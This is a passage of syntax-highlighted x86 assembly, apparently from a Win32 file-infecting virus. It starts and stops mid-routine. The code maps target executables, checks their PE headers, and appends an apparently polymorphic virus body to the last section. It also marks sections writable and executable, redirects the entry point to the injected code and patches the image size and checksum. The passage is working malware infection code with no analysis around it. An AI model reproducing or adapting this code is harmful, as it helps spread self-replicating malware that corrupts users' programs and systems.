    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ie_close</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;MapViewOfFile</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ie_mclose</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ie_unmap</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">MZ_crlc</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ie_tested</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">MZ_lfarlc</span><span class="sc4">],</span><span class="sc2">64</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ie_unmap</span><span class="sc0">
   </span><span class="sc5">ie_tested</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">4550h</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ie_unmap</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsize</span><span class="sc4">-</span><span class="sc5">infect_exe</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">other_process</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">;active check_infected process</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ie_unmap</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">other_process</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">;active create_infected process</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ie_unmap</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ie_unmap</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ie_unmap</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ie_section</span><span class="sc4">-</span><span class="sc5">infect_exe</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_Magic</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">inf_ep</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">other_process</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">        </span><span class="sc1">;active poly_engine process</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">align_d</span><span class="sc4">-</span><span class="sc5">infect_exe</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;UnMapViewOfFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CloseHandle</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">align_d</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CreateFileMappingA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;thx2 Bumblebee for his help</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">eax.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ie_section</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_Magic</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">ie_change_flag</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc5">eax.SH_Characteristics</span><span class="sc4">],</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ie_change_flag</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_Magic</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">inf_ep</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">+</span><span class="sc5">ci_size</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;poly vbody</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">68</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ie_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">ie_1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">ie_2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">ie_2</span><span class="sc4">:</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> \
           </span><span class="sc5">IMAGE_SCN_CNT_CODE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
           </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">
    </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_CheckSum</span><span class="sc4">]</span><span class="sc0"> !</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">fsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">other_process</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">        </span><span class="sc1">;active checksum process</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">paramz</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">NT_OptionalHeader.OH_CheckSum</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">.endif</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">align_d</span><span class="sc4">-</span><span class="sc5">infect_exe</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">+</span><span class="sc2">260</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc10">tbyte</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc5">ie_unmap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;UnMapViewOfFile</span><span class="sc0">
   </span><span class="sc5">ie_mclose</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">apiz</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;CloseHandle</span><span class="sc0">
   </span><span class="sc5">ie_close</span><span class="sc4">:</span><span class="sc0">
